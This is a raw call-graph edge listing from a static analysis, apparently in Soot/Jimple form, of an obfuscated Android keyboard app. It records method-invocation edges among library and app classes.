SPECIAL edge: specialinvoke $r2.<hns: void <init>()>() in <hnt: void <clinit>()> ==> <hns: void <init>()>
CLINIT edge: staticinvoke <lvs: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lvs: void <clinit>()>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <java.lang.Enum: boolean equals(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.AbstractMap$SimpleImmutableEntry: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Enum: int ordinal()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $z0 = staticinvoke <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>($r0) in <ivw: ivw g(java.lang.String)> ==> <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>
SPECIAL edge: specialinvoke r0.<java.lang.RuntimeException: void <init>()>() in <java.lang.NullPointerException: void <init>(java.lang.String)> ==> <java.lang.RuntimeException: void <init>()>
INTERFACE edge: $r6 = interfaceinvoke $r9.<java.util.Map$Entry: java.lang.Object getKey()>() in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.k: java.lang.Object getKey()>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(5) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
VIRTUAL edge: $r1 = virtualinvoke r0.<lma: lkq f()>() in <lma: lkq k()> ==> <lqn: lkq f()>
SPECIAL edge: specialinvoke r0.<lim: void <init>()>() in <llo: void <init>(lkx,int)> ==> <lim: void <init>()>
STATIC edge: $r8 = staticinvoke <ivw: ivw d(java.util.Locale)>($r9) in <ivw: void <clinit>()> ==> <ivw: ivw d(java.util.Locale)>
STATIC edge: $z0 = staticinvoke <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>($r1) in <ivv: ivw b(java.lang.String)> ==> <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>
VIRTUAL edge: $i0 = virtualinvoke $r0.<java.lang.Object: int hashCode()>() in <izw: int ad(java.lang.Object)> ==> <java.lang.String: int hashCode()>
SPECIAL edge: specialinvoke r0.<java.util.AbstractMap: void <init>()>() in <j$.util.concurrent.ConcurrentHashMap: void <init>()> ==> <java.util.AbstractMap: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r0) in <ojg: boolean f(java.lang.Object,java.lang.Object)> ==> <ivw: boolean equals(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <ivw: boolean w(char[],int,int)>($r4, $i4, $i5) in <nzh: boolean f(ivv)> ==> <ivw: boolean w(char[],int,int)>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>(45) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
CLINIT edge: staticinvoke <hnt: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <hnt: void <clinit>()>
INTERFACE edge: $r2 = interfaceinvoke $r3.<java.util.Map$Entry: java.lang.Object getKey()>() in <llg: java.lang.Object next()> ==> <lki: java.lang.Object getKey()>
SPECIAL edge: specialinvoke r0.<qj: void <init>(int)>(0) in <qj: void <init>()> ==> <qj: void <init>(int)>
STATIC edge: $i0 = staticinvoke <java.lang.Integer: int numberOfLeadingZeros(int)>($i0) in <j$.util.concurrent.ConcurrentHashMap: int n(int)> ==> <java.lang.Integer: int numberOfLeadingZeros(int)>
VIRTUAL edge: $r5 = virtualinvoke $r2.<lts: java.lang.Object d(lsz)>($r3) in <lsd: boolean b(lsr)> ==> <lsm: java.lang.Object d(lsz)>
SPECIAL edge: specialinvoke $r1.<mag: void <init>(java.lang.String,int,int)>("STICKER_JSON", 1, 1) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.String: boolean isEmpty()>() in <ivv: ivw i(java.lang.String)> ==> <java.lang.String: boolean isEmpty()>
SPECIAL edge: specialinvoke $r12.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>("Unrecognized language tag") in <ivv: ivw b(java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("ExpressiveStickerMetadata", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
VIRTUAL edge: $r3 = virtualinvoke $r4.<ltc: java.lang.String toString()>() in <lss: void <init>(java.lang.Throwable,ltc,java.lang.StackTraceElement[])> ==> <java.lang.Enum: java.lang.String toString()>
VIRTUAL edge: $r6 = virtualinvoke $r7.<lsq: java.lang.String d()>() in <lsc: void f(java.lang.String,ltn)> ==> <lsp: java.lang.String d()>
SPECIAL edge: specialinvoke $r0.<java.util.concurrent.atomic.AtomicReference: void <init>()>() in <bel: void <clinit>()> ==> <java.util.concurrent.atomic.AtomicReference: void <init>()>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.AssertionError: void <init>(java.lang.Object)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.AbstractMap$SimpleImmutableEntry: boolean equals(java.lang.Object)>
STATIC edge: staticinvoke <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>($r1, 0, $r2, $i1, $i0) in <lql: int b(java.lang.Object[],int)> ==> <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>
SPECIAL edge: specialinvoke $r14.<java.lang.StringBuilder: void <init>()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: void <init>()>
INTERFACE edge: $r8 = interfaceinvoke $r7.<java.util.Set: java.util.Iterator iterator()>() in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.e: java.util.Iterator iterator()>
CLINIT edge: staticinvoke <java.lang.String: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.lang.String: void <clinit>()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lwc: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $r1 = virtualinvoke $r3.<java.lang.String: java.lang.String concat(java.lang.String)>($r1) in <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
STATIC edge: staticinvoke <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>($r2, $i2, $r12) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>
SPECIAL edge: specialinvoke $r2.<mag: void <init>(java.lang.String,int,int)>("GIS_GIF_METADATA", 2, 2) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
STATIC edge: $i5 = staticinvoke <izw: int ah(int)>($i4) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <izw: int ah(int)>
STATIC edge: $r28 = staticinvoke <java.lang.Long: java.lang.Long valueOf(java.lang.String)>($r12) in <hbw: java.lang.Object a(java.lang.Object)> ==> <java.lang.Long: java.lang.Long valueOf(java.lang.String)>
VIRTUAL edge: $l1 = virtualinvoke $r3.<j$.sun.misc.b: long j(java.lang.Class,java.lang.String)>(class "Lj$/util/concurrent/ConcurrentHashMap;", "sizeCtl") in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <j$.sun.misc.b: long j(java.lang.Class,java.lang.String)>
STATIC edge: $i3 = staticinvoke <izw: int ad(java.lang.Object)>($r1) in <ljf: boolean add(java.lang.Object)> ==> <izw: int ad(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r6) in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<java.io.ObjectStreamField: void <init>(java.lang.String,java.lang.Class)>("rnd", $r1) in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <java.io.ObjectStreamField: void <init>(java.lang.String,java.lang.Class)>
VIRTUAL edge: $r8 = virtualinvoke $r7.<lsc: lsw d()>() in <ivw: ivw d(java.util.Locale)> ==> <lsc: lsw d()>
VIRTUAL edge: $i4 = virtualinvoke r0.<ljd: int e()>() in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: int e()>
SPECIAL edge: specialinvoke $r1.<lpi: void <init>(java.lang.String,int)>("VALUE", 1) in <lpi: void <clinit>()> ==> <lpi: void <init>(java.lang.String,int)>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(14) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
SPECIAL edge: $i1 = specialinvoke r0.<ivv: int h()>() in <ivv: ivw a()> ==> <ivv: int h()>
STATIC edge: $z0 = staticinvoke <ivw: boolean A(char)>($c0) in <ivw: boolean y(char)> ==> <ivw: boolean A(char)>
VIRTUAL edge: $i0 = virtualinvoke $r4.<lma: int size()>() in <lly: lma g()> ==> <lrg: int size()>
VIRTUAL edge: $i0 = virtualinvoke r0.<lvq: int b()>() in <lvq: java.lang.Object c(int)> ==> <lvq: int b()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <j$.util.concurrent.k: void <init>(java.lang.Object,java.lang.Object,j$.util.concurrent.ConcurrentHashMap)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $r0 = virtualinvoke $r2.<java.lang.Class: java.lang.reflect.Field getDeclaredField(java.lang.String)>("theUnsafe") in <j$.sun.misc.b: java.lang.reflect.Field i()> ==> <java.lang.Class: java.lang.reflect.Field getDeclaredField(java.lang.String)>
INTERFACE edge: $r2 = interfaceinvoke $r3.<java.util.Map$Entry: java.lang.Object getValue()>() in <llg: java.lang.Object next()> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getValue()>
SPECIAL edge: $i2 = specialinvoke r0.<lvr: int a(java.util.Map$Entry,int,int,java.lang.Object[],int[])>($r7, $i3, $i2, $r4, $r5) in <lvr: void <init>(lvr,lvr)> ==> <lvr: int a(java.util.Map$Entry,int,int,java.lang.Object[],int[])>
INTERFACE edge: interfaceinvoke $r10.<java.util.List: boolean add(java.lang.Object)>($r3) in <ivw: ivw d(java.util.Locale)> ==> <java.util.ArrayList: boolean add(java.lang.Object)>
STATIC edge: $r2 = staticinvoke <her: her k(miy)>($r1) in <her: void <clinit>()> ==> <her: her k(miy)>
VIRTUAL edge: $r0 = virtualinvoke $r1.<java.lang.ThreadLocal: java.lang.Object get()>() in <j$.util.concurrent.ThreadLocalRandom: int a(int)> ==> <java.lang.ThreadLocal: java.lang.Object get()>
SPECIAL edge: specialinvoke $r0.<gwk: void <init>()>() in <gwk: void <clinit>()> ==> <gwk: void <init>()>
STATIC edge: $r1 = staticinvoke <lqq: java.lang.Object u(java.lang.Object[],int,int,int)>($r0, $i2, $i0, $i1) in <lqq: java.lang.Object s(java.lang.Object[],int,int,int)> ==> <lqq: java.lang.Object u(java.lang.Object[],int,int,int)>
VIRTUAL edge: $r3 = virtualinvoke $r1.<ljd: java.lang.Object k(int)>($i0) in <ljb: java.lang.Object getValue()> ==> <ljd: java.lang.Object k(int)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <lvt: int hashCode()>
STATIC edge: $r4 = staticinvoke <lqq: lqq r(int,java.lang.Object[],lkt)>($i0, $r1, r0) in <lkt: lkx b(boolean)> ==> <lqq: lqq r(int,java.lang.Object[],lkt)>
SPECIAL edge: specialinvoke $r2.<java.lang.String: void <init>(char[])>($r0) in <iwt: java.lang.String e(java.lang.String)> ==> <java.lang.String: void <init>(char[])>
VIRTUAL edge: $r2 = virtualinvoke r0.<lid: java.lang.Object getValue()>() in <lid: int hashCode()> ==> <lki: java.lang.Object getValue()>
SPECIAL edge: specialinvoke $r3.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r2) in <ivv: void f(java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
INTERFACE edge: $r4 = interfaceinvoke $r3.<java.util.Map$Entry: java.lang.Object getKey()>() in <lvr: int a(java.util.Map$Entry,int,int,java.lang.Object[],int[])> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getKey()>
CLINIT edge: staticinvoke <hcb: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <hcb: void <clinit>()>
STATIC edge: $i7 = staticinvoke <java.lang.Integer: int numberOfLeadingZeros(int)>($i0) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <java.lang.Integer: int numberOfLeadingZeros(int)>
STATIC edge: $r0 = staticinvoke <lsh: lsh j(java.lang.String)>("com/google/android/libraries/inputmethod/notificationcenter/ComponentsReadinessManager") in <iej: void <clinit>()> ==> <lsh: lsh j(java.lang.String)>
INTERFACE edge: $r2 = interfaceinvoke $r1.<java.util.Map$Entry: java.lang.Object getKey()>() in <lli: void c(java.util.Map$Entry)> ==> <lki: java.lang.Object getKey()>
STATIC edge: staticinvoke <idq: idq a(java.lang.String,mag)>("TenorSearchSuggestionMetadata", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(", error index: ") in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
INTERFACE edge: $r9 = interfaceinvoke $r8.<java.util.Map$Entry: java.lang.Object getValue()>() in <lmb: lme f()> ==> <lki: java.lang.Object getValue()>
SPECIAL edge: specialinvoke $r3.<lsf: void <init>(lsh,java.util.logging.Level)>(r0, $r1) in <lsh: lse h(java.util.logging.Level)> ==> <lsf: void <init>(lsh,java.util.logging.Level)>
VIRTUAL edge: $r2 = virtualinvoke r0.<ljd: java.lang.Object[] x()>() in <ljd: void t(int)> ==> <ljd: java.lang.Object[] x()>
VIRTUAL edge: $r10 = virtualinvoke $r9.<lma: lsa l()>() in <hbv: void j()> ==> <lmc: lsa l()>
STATIC edge: staticinvoke <izw: boolean D(java.util.Collection,java.util.Iterator)>($r1, $r0) in <lri: java.util.ArrayList P(java.util.Iterator)> ==> <izw: boolean D(java.util.Collection,java.util.Iterator)>
SPECIAL edge: specialinvoke $r0.<java.lang.Object: void <init>()>() in <ljd: void <clinit>()> ==> <java.lang.Object: void <init>()>
CLINIT edge: staticinvoke <bel: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <bel: void <clinit>()>
VIRTUAL edge: $z0 = virtualinvoke $r3.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lsm: int a(lsz)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <java.lang.Object: int hashCode()>
VIRTUAL edge: $c1 = virtualinvoke $r1.<java.lang.String: char charAt(int)>($i2) in <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)> ==> <java.lang.String: char charAt(int)>
STATIC edge: staticinvoke <izw: void an(java.lang.Object,int,int)>($r1, $i5, $i1) in <ljd: int z(int,int,int,int)> ==> <izw: void an(java.lang.Object,int,int)>
STATIC edge: $r1 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r1) in <lma: lma i(int,java.lang.Object[])> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<liz: void b()>() in <liz: java.lang.Object next()> ==> <liz: void b()>
STATIC edge: $r22 = staticinvoke <lwf: java.lang.StackTraceElement[] b(java.lang.Class,int)>(class "Llsn;", $i0) in <lsd: boolean b(lsr)> ==> <lwf: java.lang.StackTraceElement[] b(java.lang.Class,int)>
INTERFACE edge: $r7 = interfaceinvoke $r10.<java.util.Collection: java.util.Iterator iterator()>() in <lmb: lme f()> ==> <liy: java.util.Iterator iterator()>
SPECIAL edge: specialinvoke $r5.<java.lang.AssertionError: void <init>(java.lang.Object)>("Couldn\'t get the Unsafe") in <j$.sun.misc.b: void <clinit>()> ==> <java.lang.AssertionError: void <init>(java.lang.Object)>
VIRTUAL edge: $r5 = virtualinvoke $r0.<java.lang.StringBuilder: java.lang.String toString()>() in <izw: java.lang.Object al(int)> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke r0.<lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)>($r1, $r2, $z0, 1) in <lsz: void <init>(java.lang.String,java.lang.Class,boolean)> ==> <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)>
VIRTUAL edge: $i0 = virtualinvoke $r2.<java.lang.String: int length()>() in <ivv: ivw a()> ==> <java.lang.String: int length()>
SPECIAL edge: specialinvoke r0.<lkg: void c(java.lang.Object)>($r1) in <lly: void j(java.lang.Object)> ==> <lkg: void c(java.lang.Object)>
STATIC edge: staticinvoke <ojg: void g(java.lang.Throwable,java.lang.String)>($r0, $r1) in <ojg: void h(java.lang.Throwable)> ==> <ojg: void g(java.lang.Throwable,java.lang.String)>
VIRTUAL edge: $r6 = virtualinvoke $r5.<java.text.SimpleDateFormat: java.lang.String format(java.util.Date)>($r3) in <lsc: void f(java.lang.String,ltn)> ==> <java.text.DateFormat: java.lang.String format(java.util.Date)>
STATIC edge: $r3 = staticinvoke <kes: java.lang.String k(nfe)>($r26) in <jlu: int compare(java.lang.Object,java.lang.Object)> ==> <kes: java.lang.String k(nfe)>
STATIC edge: $r0 = staticinvoke <lsh: lsh j(java.lang.String)>("com/google/android/apps/inputmethod/latin/ImeLatinApp") in <com.google.android.apps.inputmethod.latin.ImeLatinApp: void <clinit>()> ==> <lsh: lsh j(java.lang.String)>
STATIC edge: $r0 = staticinvoke <lth: lth i(java.lang.String)>("AndroidIME") in <hef: void <clinit>()> ==> <lth: lth i(java.lang.String)>
STATIC edge: $l0 = staticinvoke <lum: long b()>() in <lsn: void <init>(java.util.logging.Level)> ==> <lum: long b()>
VIRTUAL edge: $r1 = virtualinvoke $r1.<java.lang.String: java.lang.String concat(java.lang.String)>($r5) in <lvs: lvs a(java.lang.Object)> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
VIRTUAL edge: $r6 = virtualinvoke $r7.<lsq: java.lang.String d()>() in <lsc: void f(java.lang.String,ltn)> ==> <lso: java.lang.String d()>
VIRTUAL edge: $z2 = virtualinvoke $r1.<java.lang.String: boolean isEmpty()>() in <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)> ==> <java.lang.String: boolean isEmpty()>
VIRTUAL edge: $z2 = virtualinvoke $r2.<j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>(r0, $l3, 0, 1) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>
STATIC edge: $r1 = staticinvoke <izw: java.util.Collection at(java.lang.Iterable)>($r0) in <izw: java.lang.Object[] S(java.lang.Iterable)> ==> <izw: java.util.Collection at(java.lang.Iterable)>
STATIC edge: $i1 = staticinvoke <lma: int e(int)>($i0) in <lqk: void <init>(java.lang.Object[],int)> ==> <lma: int e(int)>
VIRTUAL edge: $r3 = virtualinvoke $r2.<j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)>($r0) in <hcb: hbv v(j$.util.concurrent.ConcurrentHashMap,java.lang.String,java.lang.Object)> ==> <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)>
VIRTUAL edge: $r2 = virtualinvoke $r9.<java.lang.StringBuilder: java.lang.String toString()>() in <iej: void g(java.lang.String,iec)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: virtualinvoke r0.<hbv: void j()>() in <hbv: boolean o()> ==> <hbv: void j()>
SPECIAL edge: $r1 = specialinvoke r0.<ljf: java.lang.Object[] s()>() in <ljf: java.lang.Object[] toArray()> ==> <ljf: java.lang.Object[] s()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <java.lang.String: int hashCode()>
STATIC edge: $z0 = staticinvoke <ivw: boolean u(char)>($c1) in <ivw: boolean F(java.lang.String)> ==> <ivw: boolean u(char)>
STATIC edge: $r2 = staticinvoke <ivw: ivv I()>() in <ivw: ivw d(java.util.Locale)> ==> <ivw: ivv I()>
VIRTUAL edge: $i0 = virtualinvoke $r0.<java.lang.String: int length()>() in <ivw: boolean B(java.lang.String)> ==> <java.lang.String: int length()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <j$.util.concurrent.ConcurrentHashMap: int hashCode()>
VIRTUAL edge: $l1 = virtualinvoke $r3.<j$.sun.misc.b: long j(java.lang.Class,java.lang.String)>(class "Lj$/util/concurrent/ConcurrentHashMap;", "cellsBusy") in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <j$.sun.misc.b: long j(java.lang.Class,java.lang.String)>
STATIC edge: $r3 = staticinvoke <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)>($r1, $r2, $i0, 0, $r3) in <lqq: java.lang.Object get(java.lang.Object)> ==> <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)>
STATIC edge: $z1 = staticinvoke <j$.util.Objects: boolean deepEquals(java.lang.Object,java.lang.Object)>($r2, $r1) in <hbv: void k(java.lang.Object,boolean)> ==> <j$.util.Objects: boolean deepEquals(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<androidx.core.content.FileProvider: void <init>()>() in <dummyMainClass: androidx.core.content.FileProvider dummyMainMethod_androidx_core_content_FileProvider(android.content.Intent)> ==> <androidx.core.content.FileProvider: void <init>()>
VIRTUAL edge: $r3 = virtualinvoke $r6.<java.lang.String: java.lang.String concat(java.lang.String)>($r3) in <ivw: ivw d(java.util.Locale)> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
CLINIT edge: staticinvoke <j$.util.concurrent.r: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <j$.util.concurrent.r: void <clinit>()>
SPECIAL edge: specialinvoke r0.<lqd: void <init>()>() in <lqc: void <init>()> ==> <lqd: void <init>()>
VIRTUAL edge: $r3 = virtualinvoke r0.<ljd: int[] w()>() in <ljd: int z(int,int,int,int)> ==> <ljd: int[] w()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.String: int hashCode()>() in <ivw: int hashCode()> ==> <java.lang.String: int hashCode()>
STATIC edge: $z0 = staticinvoke <lma: boolean x(int,int)>($i5, $i1) in <lma: lma i(int,java.lang.Object[])> ==> <lma: boolean x(int,int)>
STATIC edge: staticinvoke <iwt: void g(char[],int,int)>($r3, $i2, 2) in <ivv: ivw b(java.lang.String)> ==> <iwt: void g(char[],int,int)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("Invalid subtag: ") in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
CLINIT edge: staticinvoke <lsn: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lsn: void <clinit>()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r6) in <ojg: void v(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i0) in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
STATIC edge: staticinvoke <nvw: void j(int[],int[],int,int,int)>($r4, $r4, $i0, $i3, $i1) in <qj: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <nvw: void j(int[],int[],int,int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
INTERFACE edge: $r4 = interfaceinvoke $r3.<java.util.List: java.util.Iterator iterator()>() in <ivv: java.lang.String c()> ==> <java.util.ArrayList: java.util.Iterator iterator()>
INTERFACE edge: $i0 = interfaceinvoke $r3.<java.util.List: int size()>() in <hbw: java.lang.Object a(java.lang.Object)> ==> <lql: int size()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i0) in <ivv: ivw a()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
VIRTUAL edge: $z0 = virtualinvoke r0.<ljd: boolean v()>() in <ljd: int f(java.lang.Object)> ==> <ljd: boolean v()>
SPECIAL edge: specialinvoke $r1.<ljb: void <init>(ljd,int)>($r2, $i0) in <liw: java.lang.Object a(int)> ==> <ljb: void <init>(ljd,int)>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r2) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: void <init>()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $r12 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l r(j$.util.concurrent.s)>($r19) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l r(j$.util.concurrent.s)>
VIRTUAL edge: virtualinvoke r0.<lli: void e(java.lang.Object,java.lang.Object)>($r2, $r3) in <lli: void c(java.util.Map$Entry)> ==> <lli: void e(java.lang.Object,java.lang.Object)>
INTERFACE edge: $l0 = interfaceinvoke $r2.<ltn: long e()>() in <lsc: void f(java.lang.String,ltn)> ==> <lsn: long e()>
VIRTUAL edge: $r2 = virtualinvoke $r1.<ljf: java.lang.Object e(int)>($i0) in <lje: java.lang.Object next()> ==> <ljf: java.lang.Object e(int)>
SPECIAL edge: specialinvoke r0.<java.lang.Enum: void <init>(java.lang.String,int)>($r1, $i0) in <lpi: void <init>(java.lang.String,int)> ==> <java.lang.Enum: void <init>(java.lang.String,int)>
VIRTUAL edge: $z0 = virtualinvoke $r4.<nzh: boolean e()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: boolean e()>
SPECIAL edge: specialinvoke $r1.<ltc: void <init>(java.lang.String,int,int)>("SMALL", 0, 10) in <ltc: void <clinit>()> ==> <ltc: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractSet: int hashCode()>
VIRTUAL edge: $r3 = virtualinvoke $r1.<lkf: java.lang.Object get(java.lang.Object)>($r2) in <ivw: java.lang.String p()> ==> <lqk: java.lang.Object get(java.lang.Object)>
SPECIAL edge: specialinvoke $r2.<java.lang.IllegalStateException: void <init>(java.lang.String)>("cannot request log site information prior to postProcess()") in <lsn: lsq f()> ==> <java.lang.IllegalStateException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r8.<mag: void <init>(java.lang.String,int,int)>("TENOR_GIF_FULL_IMAGE", 8, 8) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
SPECIAL edge: specialinvoke $r12.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>("extlang subtag only occurs when language subtag length is 2 or 3") in <ivv: ivw b(java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i1) in <lsc: void f(java.lang.String,ltn)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r4) in <lqc: int compare(java.lang.Object,java.lang.Object)> ==> <iye: java.lang.Object w(java.lang.Object)>
INTERFACE edge: $i1 = interfaceinvoke $r4.<java.util.Set: int size()>() in <lqs: boolean equals(java.lang.Object)> ==> <liy: int size()>
